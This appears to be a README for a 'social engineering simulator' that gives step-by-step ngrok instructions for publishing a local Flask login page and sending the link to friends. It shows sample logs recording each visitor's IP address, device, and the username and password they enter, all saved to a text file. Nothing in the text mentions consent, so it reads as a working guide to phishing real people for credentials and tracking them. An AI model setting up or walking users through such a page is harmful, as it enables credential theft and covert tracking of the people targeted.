# 🚀 ngrok Setup - Make App Public

## ⚡ Quick Setup (5 minutes)

### Step 1: Download ngrok
1. Visit: https://ngrok.com/download
2. Click "Windows" 
3. Download the ZIP file
4. Extract the ZIP file
5. Copy `ngrok.exe` to: `d:\socialeng_simulator\socialeng_simulator\`

### Step 2: Run the App Publicly

Double-click this file: `share_with_ngrok.bat`

OR manually run:

**Option A: Using batch file (Easiest)**
```
share_with_ngrok.bat
```

**Option B: Manual commands**
```powershell
# Terminal 1 - Start Flask app
cd d:\socialeng_simulator\socialeng_simulator
python app.py

# Terminal 2 - Start ngrok tunnel
cd d:\socialeng_simulator\socialeng_simulator
ngrok http 5000
```

### Step 3: Share the Link

ngrok will show something like:
```
Forwarding    https://abc123def456.ngrok.io -> http://127.0.0.1:5000
```

Send this to your friend:
```
https://abc123def456.ngrok.io/
```

---

## 📊 What Your Friend Sees

1. Opens link: `https://abc123def456.ngrok.io/`
2. Sees normal login page
3. Clicks "Go to Login" 
4. **Their IP gets logged** in your backend!

---

## 📝 What Gets Logged (Backend)

When friend clicks "Go to Login":
```
====== LOGIN EVENT ======
Time       : 2026-04-30 23:55:30.123456
Action     : Login Button Clicked
IP Address : 203.120.45.67        ← Friend's Internet IP
Device     : Chrome / Windows
Username   : 
Password   : 
Status     : 
=========================
```

When friend submits form:
```
====== LOGIN EVENT ======
Time       : 2026-04-30 23:55:45.654321
Action     : Login Form Submitted
IP Address : 203.120.45.67        ← Same IP
Device     : Chrome / Windows
Username   : friend_username
Password   : friend_password
Status     : Login Successfully
=========================
```

---

## 🔗 Link Types

**Local (Same WiFi):**
```
http://192.168.0.103:5000/
```

**Public (Different Network):**
```
https://abc123def456.ngrok.io/
```

**Both log the user's IP!** ✅

---

## ⚠️ Important Notes

1. **ngrok URL changes every time** you restart
   - Previous links stop working
   - Generate new one each session

2. **Each friend gets logged**
   - Different IP per friend
   - Different device per friend
   - All data saved in `login_events.txt`

3. **Keep terminals open**
   - Flask app must run
   - ngrok tunnel must stay active
   - Close = users can't access

---

## 🎯 Example: Multiple Friends

**Friend 1** (India, Chrome):
```
IP Address : 203.120.45.67
Device     : Chrome / Windows
```

**Friend 2** (US, Safari):
```
IP Address : 45.60.100.25
Device     : Safari / macOS
```

**Friend 3** (Phone, Safari):
```
IP Address : 192.168.1.50
Device     : Safari / iOS
```

All logged and saved! 📊

---

## ❓ Troubleshooting

**"ngrok not found"**
- Download from: https://ngrok.com/download
- Extract to: `d:\socialeng_simulator\socialeng_simulator\`

**"ngrok closes immediately"**
- Flask app not running
- Start Flask app first, then ngrok

**"Link shows 'Page Not Responding'"**
- Restart both terminals
- Make sure port 5000 is free

---

**Ready to share? Double-click `share_with_ngrok.bat`!** 🚀
